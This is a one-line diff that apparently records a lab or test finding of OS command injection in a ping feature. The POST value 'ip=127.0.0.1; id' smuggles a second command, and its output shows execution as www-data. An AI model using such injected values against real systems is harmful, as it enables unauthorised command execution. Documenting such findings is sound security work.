@@ -1,0 +1,1 @@
+POST ip=127.0.0.1; id executes the id command showing uid=33(www-data) gid=33(www-data) groups=33(www-data). The ping output shows: PING 127.0.0.1 (127.0.0.1): 56 data bytes; 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.096 ms
